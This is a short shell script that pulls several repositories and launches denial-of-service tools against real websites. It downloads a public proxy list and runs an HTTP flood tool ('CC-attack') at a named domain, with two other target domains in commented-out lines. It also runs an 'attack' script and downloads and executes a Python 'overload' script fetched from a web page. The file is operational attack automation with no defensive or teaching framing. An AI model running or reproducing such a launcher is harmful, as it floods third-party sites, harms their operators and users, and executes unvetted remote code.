cd ~/Nyaa-Automata
git pull

echo ""
echo "CC-attack"
cd CC-attack
git pull
curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o http.txt
#python3 cc.py -url http://fwe22.top/ -f http.txt -v 5 -s 30
#python3 cc.py -url http://fwe88.top/ -f http.txt -v 5 -s 30
python3 cc.py -url http://fwe55.top/ -f http.txt -v 5 -s 30
cd ..

echo ""
echo "HydaelynAttack"
cd HydaelynAttack
git pull
python3 HydaelynAttack_p_once_noLog.py
cd ..

echo ""
echo "overload"
cd overload
git pull
curl https://nyaacaster.github.io/Nyaa-Automata/overload_p.py -o overload_p.py
python3 overload_p.py
cd ..
